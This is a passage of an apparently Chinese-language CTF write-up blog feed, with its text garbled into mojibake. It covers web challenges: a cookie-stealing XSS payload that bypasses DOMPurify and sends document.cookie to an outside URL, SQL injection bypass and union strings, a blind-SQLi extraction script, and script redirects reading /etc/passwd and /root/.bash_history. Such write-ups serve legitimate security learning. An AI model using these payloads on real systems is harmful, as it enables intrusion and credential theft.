&lt;p>æœ€åŽï¼Œè¿™ä¸ª**çš„ä¸œè¥¿å­¦åå«&lt;a href="https://masteringjs.io/tutorials/fundamentals/thenable">Thenable Object&lt;/a>ï¼Œè°¢è°¢ä½ ï¼ŒjavascriptðŸ˜…&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://hackmd.io/@hakatashi/ryRg7oLEt">wp&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004090604105.png" alt="image-20211004090604105">&lt;/p>
&lt;h2 id="webgiita">Web/Giita&lt;/h2>
&lt;blockquote>
&lt;p>Gibson Les Paul Standard.&lt;/p>
&lt;p>Steal Cookie.&lt;/p>
&lt;/blockquote>
&lt;p>ðŸ˜­ðŸ˜­ðŸ˜­åˆæ˜¯cookie&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004082810346.png" alt="image-20211004082810346">&lt;/p>
&lt;p>çœ‹æºç ï¼Œapp.js&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004161650511.png" alt="image-20211004161650511">&lt;/p>
&lt;p>11è¡Œçš„æ­£åˆ™åŒ¹é…äº†ç©ºæ ¼ã€å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ï¼Œä½†æ˜¯å¤šä½™äº†ä¸€ä¸ª&lt;code>.&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004161816780.png" alt="image-20211004161816780">&lt;/p>
&lt;p>ä¼šæŠŠthemeæ”¾è¿›åŽ»è¿›è¡Œä¸€ä¸ªè¿‡æ»¤&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004162229240.png" alt="image-20211004162229240">&lt;/p>
&lt;p>ç„¶åŽæ‹¼æŽ¥åˆ°stylesheet linkä¸­ï¼Œå°±å†æ²¡æœ‰ä»€ä¹ˆè¿‡æ»¤äº†&lt;/p>
&lt;p>æˆ‘ä»¬å¯ä»¥æ³¨å…¥åˆ°hrefè¿™é‡Œï¼Œæ¯”å¦‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#75715e">&amp;lt;!-- theme=x%20onerror%3Dalert --&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">link&lt;/span> &lt;span style="color:#75af00">rel&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;stylesheet&amp;#34;&lt;/span> &lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">x&lt;/span> &lt;span style="color:#75af00">onerror&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">alert&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¦å®Œæ•´çš„æ³¨å…¥jsä»£ç ï¼Œæˆ‘ä»¬éœ€è¦cheat DOMPurify&lt;/p>
&lt;p>DOMPurifyä¼šå…ˆ&lt;a href="https://github.com/cure53/DOMPurify/blob/main/src/purify.js#L156-L160">æ£€æµ‹å¯¹è±¡&lt;/a>åœ¨ä¸åœ¨&lt;code>DOMPurify.isSupported&lt;/code>çš„èŒƒå›´å†…&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004163456492.png" alt="image-20211004163456492">&lt;/p>
&lt;p>æ‰€ä»¥å‘¢ï¼Œæˆ‘ä»¬æŠŠå®ƒç»™å…³å’¯&lt;/p>
&lt;pre tabindex="0">&lt;code>delete document.implementation.__proto__.createHTMLDocument
&lt;/code>&lt;/pre>&lt;p>æœ€åŽçš„Payloadï¼ŒU+00A0(NBSP)ä¸åœ¨htmlçš„ç©ºç™½ç¬¦ä¸­ï¼Œä½†æ˜¯åœ¨Javascriptçš„ç©ºç™½ç¬¦ä¸­&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="color:#75af00">axios&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">method&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;post&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">`http://&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">host&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">:&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">port&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">/`&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">headers&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#39;content-type&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;application/x-www-form-urlencoded&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">},&lt;/span>
&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">qs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">encode&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">theme&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;x onerror=delete\xA0document.implemenation__proto__.createHTMLDocument&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">title&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;x&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">`&amp;lt;img src=&amp;#34;x&amp;#34; onerror=&amp;#34;location.href&amp;#34;=&amp;#39;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">?&amp;#39; + document.cookie&amp;gt;`&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">}),&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å®Œæ•´å‚è§-&amp;gt;&lt;a href="https://hackmd.io/@hakatashi/HkgG02U4t">wp&lt;/a>&lt;/p>
&lt;hr>
&lt;p>å°±æ˜¯èœ ä¸ä¼šåš å‹‰å¼ºçœ‹çœ‹wp è¿˜ä¸ä¸€å®šçœ‹å¾—æ‡‚&lt;/p>
&lt;p>é“åºŸç‰©äº†ðŸ˜…&lt;/p></description></item><item><title>TsukuCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/09/13/tsuku2021-wp/</link><pubDate>Mon, 13 Sep 2021 19:15:21 +0800</pubDate><guid>https://amiaaaz.github.io/2021/09/13/tsuku2021-wp/</guid><description>&lt;p>è¿™ä¸¤å¤©åˆå¼€å§‹æœ‰ç‚¹æ‘†çƒ‚çš„è¿¹è±¡ï¼ŒäºŽæ˜¯æŠŠå‘¨æœ«çš„ctfçœ‹çœ‹wpï¼Œæ°´ä¸€æ°´ï¼Œå¤çŽ°ä¸€ä¸‹&lt;/p>
&lt;p>å¦å¤–è¿™ä¸ªctfæœ€ç—›è‹¦çš„åœ°æ–¹åœ¨äºŽæ˜¯è‹±æ—¥å¤¹æ‚ï¼Œæˆ‘å¼€å§‹æ‡‚æ­ªæžœä»åšä¸­æ–‡æ¯”èµ›é¡µé¢çš„æ—¶å€™æœ‰å¤šç—›è‹¦äº†&lt;/p>
&lt;h2 id="weblogonly">Web/logonly&lt;/h2>
&lt;p>ç»™å‡ºçš„æ˜¯ä¸€ä¸ªæœ‰214155è¡Œçš„æ—¥å¿—æ–‡ä»¶ï¼Œåªæœ‰ç¬¬214154è¡Œè¿”å›ž200ok&lt;/p>
&lt;p>æ˜¾ç„¶æ˜¯è¿›è¡Œäº†ä¸€ä¸ªå­—å…¸æ”»å‡»ï¼Œåœ¨ç¬¬214154æ¬¡å°è¯•æ—¶æ’žå¯¹äº†ï¼Œæˆ‘ä»¬ä¸‹è½½ä¸€ä»½kalié‡Œçš„rockyou.txtä¸­çœ‹ä¸€ä¸‹214154æ˜¯ä¸ªå•¥ï¼ˆæœ‰æç¤ºç”¨åˆ°kaliè¿›è¡Œæ”»å‡»ï¼‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210912171725965.png" alt="image-20210912171725965">&lt;/p>
&lt;p>&lt;code>TsukuCTF{qwertyuiop[]\\}&lt;/code>&lt;/p>
&lt;h2 id="webdigits">Web/digits&lt;/h2>
&lt;p>ä¸€ä¸ªfastapiç«™ï¼Œä½†æ˜¯è¦æ±‚ä¸æ˜¯å¾ˆé«˜çš„æ ·å­&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210912174109098.png" alt="image-20210912174109098">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210912174032687.png" alt="image-20210912174032687">&lt;/p>
&lt;p>åŠ å·æ”¾åˆ°urlä¸­ç›¸å½“äºŽåŠè§’ç©ºæ ¼&lt;/p>
&lt;p>&lt;code>TsukuCTF{you_are_lucky_Tsukushi}&lt;/code>&lt;/p>
&lt;h2 id="weblogin">Web/login&lt;/h2>
&lt;p>ç™»å½•æ¡†ï¼Œä¸‡èƒ½å¯†ç &lt;code>admin'or 1#&lt;/code>&lt;/p>
&lt;p>&lt;code>TsukuCTF{You_4r3_SUP3R_H4CKER}&lt;/code>&lt;/p>
&lt;p>ä¸€èˆ¬è¿™ç§ç®€å•çš„ç™»å½•éƒ½æ˜¯ä¸‡èƒ½å¯†ç ï¼Œä½†æ˜¯ä¹Ÿå¾—å¤šè¯•ä¸€è¯•ï¼ŒåŠ ä¸ªæ³¨é‡Šç¬¦å•Š åˆ†å·ä»€ä¹ˆçš„&lt;/p>
&lt;h2 id="weblogin2">Web/login2&lt;/h2>
&lt;p>è¯´æ˜¯ä»£ç é‡æž„è¿‡äº†&lt;/p>
&lt;p>å†ç”¨ä¸Šé¢çš„ä¸‡èƒ½å¯†ç ç™»å…¥ä¼šæ˜¾ç¤ºè¿™ä¸ªç«™çš„æ‰€æœ‰è´¦å·&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210912175523340.png" alt="image-20210912175523340">&lt;/p>
&lt;p>è¯´æ˜Žè¿˜æ˜¯æœ‰sqliï¼Œå°è¯•ä¸€ä¸‹è”åˆæ³¨å…¥&lt;code>admin'or 1 union select null,null#&lt;/code>ï¼Œè·Ÿä¸Šé¢æ˜¯ä¸€æ ·çš„å›žæ˜¾ï¼Œè¯´æ˜Žæœ‰ä¸¤åˆ—ï¼Œç„¶åŽæ˜¯æ„‰å¿«çš„æ³¨å…¥ï¼ˆæ¯ä¸€æ¬¡çš„å›žæ˜¾åœ¨é¡µé¢çš„æœ«å°¾ï¼Œæ³¨æ„è¿™ä¸ªæ˜¯æœ€åˆè¦æ‰¾åˆ°å¹¶ç¡®è®¤çš„ï¼‰&lt;/p>
&lt;pre tabindex="0">&lt;code>admin'or 1 union select table_name,null from information_schema.columns#
admin'or 1 union select column_name,null from information_schema.columns where table_name='super_secret_table'#
admin'or 1 union select secret,null from super_secret_table#
&lt;/code>&lt;/pre>&lt;p>&lt;code>TsukuCTF{50_muCh_GR3AT_Hacker_!ND3ED}&lt;/code>&lt;/p>
&lt;h2 id="weblogin3">Web/login3&lt;/h2>
&lt;p>ä¾ç„¶æ˜¯å­˜åœ¨sqliï¼Œç”¨ä¸Šé¢çš„ä¸¤ä¸ªpayloadéƒ½èƒ½å›žæ˜¾æ­£å¸¸ï¼Œä½†æ˜¯æ²¡æœ‰æ˜Žç¡®çš„ä¿¡æ¯ï¼Œåº”è¯¥æ˜¯éœ€è¦ç›²æ³¨äº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">_execAnyQuery_core&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pos&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">mid&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">params&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;name&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39;or ascii(substring((&lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">),&lt;/span>&lt;span style="color:#d88200">{1}&lt;/span>&lt;span style="color:#d88200">,1))&amp;gt;=&lt;/span>&lt;span style="color:#d88200">{2}&lt;/span>&lt;span style="color:#d88200">;#&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pos&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">mid&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;a&amp;#34;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">page&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;ã‚ˆã†ã“ã&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">page&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">_execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pos&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">low&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;span style="color:#111">high&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#111">high&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#111">low&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">mid&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">high&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">low&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">_execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pos&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">mid&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">low&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">mid&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">high&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">mid&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">low&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">char&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">_execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">char&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">char&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">end&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#111">execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;select version()&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">100&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;select distinct table_name from information_schema.columnns limit 1 offset &lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;select distinct column_name from information_shcema.columns where table_name=&amp;#39;urtla_secret_tsukushi&amp;#39;limit 1 offset &lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">33&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;select secret from urtla_secret_tsukushi_limit 1 offset &lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™æ˜¯å®˜æ–¹wpé‡Œçš„äºŒåˆ†æ³•è„šæœ¬ï¼ŒæŠŠç®€å•çš„äº‹æ‹†æˆäº†3ä¸ªå‡½æ•°ï¼Œå€’æ˜¯ä¹Ÿå¥½ï¼Œå¯å¤ç”¨æ€§max&lt;/p>
&lt;p>&lt;code>TsukuCTF{U_Are_Geni0us_T$UKUSH1}&lt;/code>&lt;/p>
&lt;h2 id="webjourney">Web/Journey&lt;/h2>
&lt;p>æŠ“åŒ…çœ‹ï¼Œæœ‰å¾ˆå¤š307é‡å®šå‘ï¼Œè¿˜ä»¥ä¸ºæ˜¯è·Ÿä¹‹å‰é‚£ä¸ªä¸€æ ·è¦è·‘ä¸€ä¸‹ä¸€åƒå¤šæ¬¡çš„é‡å®šå‘ï¼Œä½†æ˜¯è¿™ä¸ªé‡å®šå‘æ˜¯æœ‰é™åº¦çš„ï¼Œæœ€åŽçš„ä½ç½®æ˜¯/problems/journey/goalï¼Œå›žæ˜¾405é”™è¯¯&lt;/p>
&lt;p>çœ‹wpï¼Œå­¦åˆ°äº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl -H &lt;span style="color:#d88200">&amp;#39;Referer: https://tsukuctf.sechack365.com/problems/journey/railway/1&amp;#39;&lt;/span> -X CONNECT https://tsukuctf.sechack365.com/problems/journey/goal
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210913114745032.png" alt="image-20210913114745032">&lt;/p>
&lt;p>åˆ©ç”¨çš„æ˜¯httpè¯·æ±‚ä¸­çš„connectæ–¹æ³•ï¼Œç›¸å…³å†…å®¹å¯å‚è§-&amp;gt;&lt;a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/CONNECT">CONNECT(MDN)&lt;/a> | &lt;a href="https://www.jianshu.com/p/54357cdd4736">HTTPä¹‹connect method&lt;/a>&lt;/p>
&lt;h2 id="webgyotaku">Web/gyOTAKU&lt;/h2>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210913120544616.png" alt="image-20210913120544616">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210913120625401.png" alt="image-20210913120625401">&lt;/p>
&lt;p>æ»¡è¶³17è¡Œè¦æ±‚çš„è¯ä¼šé€šè¿‡chromium browseræ¥è¿”å›žä¸€ä¸ªæˆªå›¾&lt;/p>
&lt;p>æˆ‘ä»¬æž„é€ ä¸€ä¸ªå¦‚ä¸‹çš„htmlé¡µé¢&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;
&lt;/code>&lt;/pre>&lt;p>è¿”å›ž500é”™è¯¯ï¼Œå†è¯•ä¸€ä¸‹&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;script&amp;gt;location.href=&amp;quot;/etc/passwd&amp;quot;&amp;lt;/script&amp;gt;
&lt;/code>&lt;/pre>&lt;p>æˆåŠŸè¿”å›ž&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210913190757615.png" alt="image-20210913190757615">&lt;/p>
&lt;p>ç”¨ä¸€ä¸‹æˆ‘ä»¬çš„è€æœ‹å‹/root/.bash_history&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;script&amp;gt;location.href=&amp;quot;/root/.bash_history&amp;quot;&amp;lt;/script&amp;gt;
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210913191326852.png" alt="image-20210913191326852">&lt;/p>
&lt;p>å¯ä»¥è¯»ä¸€ä¸‹flagäº†&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;script&amp;gt;location.href=&amp;quot;/root/flagc464f9eba1.txt&amp;quot;&amp;lt;/script&amp;gt;
&lt;/code>&lt;/pre>&lt;p>&lt;code>TsukuCTF{Tsukushi_to_Sugina_no_chigai_ga_wakaran}&lt;/code>&lt;/p>
&lt;hr>
&lt;p>æ°´ä¸€ç¯‡wpï¼Œæ°´æ°´æ›´å¥åº·&lt;/p></description></item><item><title>GrabCONCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/09/07/grabconctf2021-wp/</link><pubDate>Tue, 07 Sep 2021 11:22:14 +0800</pubDate><guid>https://amiaaaz.github.io/2021/09/07/grabconctf2021-wp/</guid><description>&lt;h2 id="webe4sy-pe4sy">Web/E4sy Pe4sy&lt;/h2>
&lt;blockquote>
&lt;p>Hack admin user!&lt;/p>
&lt;p>Author: &lt;strong>r3curs1v3_pr0xy&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>ä¸‡èƒ½å¯†ç  &lt;code>username=admin&amp;amp;password=%27%3D%27&lt;/code>&lt;/p>
&lt;p>&lt;code>GrabCON{E4sy_pe4sy_SQL_1nj3ct10n}&lt;/code>&lt;/p>
&lt;h2 id="webdoor-lock">Web/Door Lock&lt;/h2>
&lt;blockquote>
&lt;p>The door is open to all! See who is behind the admin door??&lt;/p>
&lt;p>Author: &lt;strong>r3curs1v3_pr0xy&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>å’Œä¸Šé¢é‚£ä¸ªä¸€æ ·çš„å‰ç«¯é¡µé¢ï¼Œä½†æ˜¯å¾ˆæ˜¾ç„¶ä¸‡èƒ½å¯†ç å¤±æ•ˆï¼Œéšä¾¿ç™»å…¥ä¸€ä¸ªå·ï¼Œæœ‰æ°´å¹³è¶Šæƒ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210904212157898.png" alt="image-20210904212157898">&lt;/p>
&lt;p>ç”¨burpè·‘ä¸€ä¸‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906134840366.png" alt="image-20210906134840366">&lt;/p>
&lt;p>&lt;code>GrabCON{E4sy_1D0R_}&lt;/code>&lt;/p>
&lt;h2 id="webnull-food-factory">Web/Null Food Factory&lt;/h2>
&lt;blockquote>
&lt;p>Prove your hacking skill to get admin panel.&lt;/p>
&lt;p>Author: &lt;strong>r3curs1v3_pr0xy&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>è¿˜æ˜¯ä¸€æ¨¡ä¸€æ ·çš„å‰ç«¯ï¼Œç›®æ ‡è¿˜æ˜¯ä»¥adminç™»å…¥&lt;/p>
&lt;p>ç”¨åˆ°çš„æ˜¯Null byte injectionï¼Œå…ˆä»¥&lt;code>admin%00&lt;/code>ä¸ºç”¨æˆ·åæ³¨å†Œ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210907105417519.png" alt="image-20210907105417519">&lt;/p>
